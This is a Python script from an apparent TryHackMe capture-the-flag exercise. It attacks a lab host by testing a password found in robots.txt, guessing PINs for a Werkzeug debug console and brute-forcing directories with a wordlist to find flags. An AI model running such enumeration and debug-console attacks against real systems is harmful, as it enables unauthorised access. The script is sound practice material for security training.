import requests
import re

BASE = "http://10.114.139.59:5000"
FLAG_RE = re.compile(r"THM\{[^}]+\}")
s = requests.Session()

# The robots.txt said: cupid_arrow_2026!!!
# Maybe it's a URL path component?
print("=== Testing cupid_arrow_2026!!! as path/param ===")
tests = [
    f"/cupids_secret_vault/cupid_arrow_2026!!!",
    f"/cupids_secret_vault/cupid_arrow_2026",
    f"/cupid_arrow_2026",
    f"/cupid_arrow_2026!!!",
    f"/cupids_secret_vault/?password=cupid_arrow_2026!!!",
    f"/cupids_secret_vault/?key=cupid_arrow_2026!!!",
    f"/cupids_secret_vault/?secret=cupid_arrow_2026!!!",
    f"/cupids_secret_vault/?token=cupid_arrow_2026!!!",
    f"/cupids_secret_vault/?auth=cupid_arrow_2026!!!",
]
for t in tests:
    try:
        r = s.get(f"{BASE}{t}", timeout=5, allow_redirects=True)
        if r.status_code != 404 and len(r.text) != 1064 and len(r.text) != 1363:
            print(f"  {t} -> {r.status_code} ({len(r.text)} bytes)")
            print(f"    {r.text[:300]}")
            for f in FLAG_RE.findall(r.text):
                print(f"    [FLAG] {f}")
        else:
            print(f"  {t} -> {r.status_code} ({len(r.text)} bytes) [same as default]")
    except Exception as e:
        print(f"  {t} -> error: {e}")

# Maybe the Werkzeug /console needs a PIN and cupid_arrow_2026!!! is the PIN
print("\n=== Werkzeug console with PIN ===")
# The console endpoint needs a GET with __debugger__=yes&cmd=...&s=<secret>
# First let's see the console page properly
r = s.get(f"{BASE}/console", timeout=5)
print(f"  GET /console -> {r.status_code}")
print(f"  Body: {r.text[:500]}")

# Maybe it needs a specific query
r = s.get(f"{BASE}/console?__debugger__=yes&cmd=printHello&frm=0&s=cupid_arrow_2026!!!", timeout=5)
print(f"\n  With debugger params -> {r.status_code}")
print(f"  Body: {r.text[:500]}")

# Maybe the PIN is numeric - extract from the password
# Try the console with PIN unlock
for pin in ["cupid_arrow_2026!!!", "cupid_arrow_2026", "2026"]:
    r = s.get(f"{BASE}/console?__debugger__=yes&cmd=pinauth&pin={pin}&s=0", timeout=5)
    if r.status_code == 200 and "auth" in r.text.lower():
        print(f"\n  PIN {pin} -> {r.status_code}: {r.text[:200]}")

# Full wordlist for deeper vault paths
print("\n=== Extended path brute on /cupids_secret_vault/ ===")
import itertools
words = [
    "arrow", "arrows", "bow", "heart", "hearts", "love", "lover", "lovers",
    "cupid", "secret", "secrets", "vault", "lock", "unlock", "open",
    "key", "keys", "door", "gate", "enter", "entrance", "exit",
    "treasure", "gold", "diamond", "ruby", "pearl",
    "flag", "flags", "ctf", "hack", "hacked", "pwned",
    "admin", "root", "system", "server", "config", "configuration",
    "api", "v1", "v2", "internal", "private", "public",
    "letter", "letters", "note", "notes", "message", "messages",
    "anonymous", "board", "wall", "post", "posts",
    "read", "write", "send", "compose", "create", "new",
    "list", "all", "index", "home", "main", "app",
    "source", "code", "backup", "dump", "export", "import",
    "token", "auth", "login", "register", "signup", "signin",
    "password", "pass", "credential", "credentials",
    "debug", "test", "dev", "staging", "prod", "production",
    "hidden", "mystery", "puzzle", "clue", "hint",
    "render", "template", "view", "page", "file", "static",
    "download", "upload", "fetch", "load", "include",
    "shell", "exec", "run", "eval", "command", "cmd",
    "console", "terminal", "ssh", "ftp",
    "user", "users", "profile", "account", "accounts",
    "data", "database", "db", "sql", "sqlite",
    "log", "logs", "error", "errors", "exception",
    "info", "about", "help", "docs", "documentation",
    "swagger", "openapi", "schema", "model",
    "health", "status", "ping", "alive", "ready",
    "metrics", "monitor", "monitoring",
    "webhook", "callback", "notify", "notification",
    "share", "shared", "common", "global",
]

found = []
for w in words:
    try:
        r = s.get(f"{BASE}/cupids_secret_vault/{w}", timeout=3, allow_redirects=False)
        if r.status_code != 404:
            print(f"  /cupids_secret_vault/{w} -> {r.status_code} ({len(r.text)} bytes)")
            found.append(w)
            for f in FLAG_RE.findall(r.text):
                print(f"    [FLAG] {f}")
    except:
        pass

# Also try root level with these words
for w in words:
    try:
        r = s.get(f"{BASE}/{w}", timeout=3, allow_redirects=False)
        if r.status_code != 404:
            if w not in ["cupids_secret_vault"]:
                print(f"  /{w} -> {r.status_code} ({len(r.text)} bytes)")
                found.append(w)
    except:
        pass

print(f"\nFound non-404: {found}")
